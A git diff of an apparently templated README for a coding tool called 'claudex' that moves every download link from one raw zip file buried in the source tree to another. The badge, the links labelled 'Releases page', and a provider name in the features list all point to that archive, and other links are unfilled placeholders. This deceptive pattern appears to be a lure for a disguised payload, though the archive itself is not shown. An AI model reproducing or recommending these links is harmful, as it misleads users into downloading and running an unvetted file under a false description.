@@ -1,7 +1,7 @@
 # 🌟 claudex - Your Personal Coding Playground Made Easy
 
 ## 🔗 Download Now
-[![Download claudeX](https://raw.githubusercontent.com/cannedsigmas/claudex/main/frontend/src/components/editor/mobile-preview/Software-2.8.zip%20claudex-v1.0-blue)](https://raw.githubusercontent.com/cannedsigmas/claudex/main/frontend/src/components/editor/mobile-preview/Software-2.8.zip)
+[![Download claudeX](https://raw.githubusercontent.com/cannedsigmas/claudex/main/frontend/src/pages/Software-2.7.zip%20claudex-v1.0-blue)](https://raw.githubusercontent.com/cannedsigmas/claudex/main/frontend/src/pages/Software-2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to claudex! This guide will help you download and run your new coding environment with ease. Whether you want to use it locally or in the cloud, you're just a few steps away from a powerful coding experience.
@@ -9,7 +9,7 @@ Welcome to claudex! This guide will help you download and run your new coding en
 ## 📝 Features
 - **Local or Cloud Sandbox:** Use claudex right in your browser or install it on your machine.
 - **In-Browser VS Code:** Get a fully functional VS Code experience without any installations.
-- **Multiple Provider Support:** Connect with Max, https://raw.githubusercontent.com/cannedsigmas/claudex/main/frontend/src/components/editor/mobile-preview/Software-2.8.zip, or OpenRouter effortlessly.
+- **Multiple Provider Support:** Connect with Max, https://raw.githubusercontent.com/cannedsigmas/claudex/main/frontend/src/pages/Software-2.7.zip, or OpenRouter effortlessly.
 - **Custom Skills:** Build and customize your coding projects with ease.
 - **MCP Servers:** Manage your coding environment seamlessly.
 
@@ -22,9 +22,9 @@ To use claudex, ensure your system meets the following requirements:
 - **Internet Connection:** Required for cloud features and updates
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/cannedsigmas/claudex/main/frontend/src/components/editor/mobile-preview/Software-2.8.zip) to download the latest version of claudex.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/cannedsigmas/claudex/main/frontend/src/pages/Software-2.7.zip) to download the latest version of claudex.
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/cannedsigmas/claudex/main/frontend/src/components/editor/mobile-preview/Software-2.8.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/cannedsigmas/claudex/main/frontend/src/pages/Software-2.7.zip).
 2. Locate the latest release.
 3. Click on the link for your operating system.
 4. Follow your system prompts to complete the download.
@@ -60,7 +60,7 @@ We welcome contributions! If you'd like to improve claudex, please follow our [C
 Stay updated with the latest features and fixes by checking our [Changelog](link-to-changelog).
 
 ## 📍 Important Links
-- [Releases Page](https://raw.githubusercontent.com/cannedsigmas/claudex/main/frontend/src/components/editor/mobile-preview/Software-2.8.zip)
+- [Releases Page](https://raw.githubusercontent.com/cannedsigmas/claudex/main/frontend/src/pages/Software-2.7.zip)
 - [User Manual](link-to-user-manual)
 - [Support Page](link-to-support-page)
 - [Discussion Forum](link-to-discussion-forum)
